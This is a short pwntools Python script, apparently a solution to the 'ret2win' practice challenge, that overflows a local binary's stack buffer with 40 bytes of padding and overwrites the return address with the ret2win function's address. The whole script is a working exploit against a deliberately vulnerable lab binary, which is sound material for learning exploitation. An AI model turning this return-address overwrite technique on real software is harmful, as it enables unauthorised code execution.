from pwn import *

#io = gdb.debug('./ret2win')
io = process('./ret2win')

#io.sendline(cyclic(80))

p = b'A' * 40
p += p64(io.elf.symbols['ret2win'])

io.sendline(p)
print(io.readall().decode())
